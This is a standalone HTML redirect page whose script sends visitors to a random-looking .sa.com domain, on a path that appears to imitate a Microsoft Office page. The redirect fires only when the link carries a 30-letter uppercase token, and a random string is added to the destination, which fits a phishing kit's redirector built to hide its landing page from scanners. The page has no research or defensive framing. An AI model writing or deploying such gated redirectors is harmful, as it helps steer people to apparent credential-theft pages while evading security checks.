<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <script>
        // Replace with your actual redirect URL
        const redirectTo = "https://iw.kicgqpj2.sa.com/m3.live/office-3D8/index.php";

        // Function to generate a random string (80 characters, mixed-case)
        function generateRandomString(length) {
            const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            let result = "";
            for (let i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() * characters.length));
            }
            return result;
        }

        // Function to get query parameters from the URL
        function getQueryParam(param) {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get(param);
        }

        // Extract and validate the 30-character uppercase string from the URL
        const upperString = getQueryParam("upperString");

        if (upperString && /^[A-Z]{30}$/.test(upperString)) {  // Ensures it is exactly 30 uppercase letters
            // Generate a random 80-character string
            const randomString = generateRandomString(80);

            // Redirect with a proper query parameter
            const newUrl = `${redirectTo}?randomString=${randomString}`;
            console.log("Redirecting to:", newUrl);  // Debugging log
            window.location.href = newUrl;
        } else {
            // If the condition is not met, show an error message
            document.body.innerHTML = "<p>Invalid URL. Please provide a valid 30-character uppercase string in the URL.</p>";
        }
    </script>
</head>
<body>
    <p>Redirecting you to the new page...</p>
</body>
</html>